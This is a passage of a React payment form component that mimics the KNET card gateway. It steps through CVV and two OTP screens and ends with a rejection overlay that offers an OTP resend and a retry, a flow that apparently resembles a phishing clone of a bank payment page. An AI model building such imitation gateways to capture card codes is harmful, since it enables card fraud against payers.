                      setKnetError(false);
                      setStep(step === "knetOtp2" ? "knetCvv" : step === "knetCvv" ? "knetOtp" : step === "knetOtp" ? "knet" : "pay");
                    }}
                    className="h-[27px] w-1/2 rounded-[4px] border border-[#cacaca] bg-[#eaeaea] text-[13px] font-bold text-[#606060]"
                  >
                    {t("cancel")}
                  </button>
                  <button
                    type="button"
                    disabled={knetBusy || pending}
                    onClick={() => void submitKnetStep()}
                    className="h-[27px] w-1/2 rounded-[4px] border border-[#cacaca] bg-[#eaeaea] text-[13px] font-bold text-[#606060] disabled:opacity-60"
                  >
                    {t("send")}
                  </button>
                </div>
              </section>
              <p className="mt-[15px] text-center text-[12px] text-black">{t("rights")}</p>
              <p className="text-center text-[12px] font-bold leading-5 text-[#0077D5]">{t("knetCompany")}</p>
            </div>
          </div>
        </div>
      )}
      {rejectKind ? (
        <KnetRejectOverlay
          kind={rejectKind}
          otpSecondsLeft={rejectKind === "otp" || rejectKind === "otp2" ? otpResendSeconds : undefined}
          onContinue={() => void finishKnetRetry(rejectKind)}
        />
      ) : null}
    </form>
  );
}

function BackIcon() {
  return (
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" className="size-6 -scale-x-100" aria-hidden="true">
      <path fill="currentColor" fillRule="evenodd" d="m8.414 12 10-10L17 .586 5.586 12 17 23.414 18.414 22z" />
    </svg>
  );
}
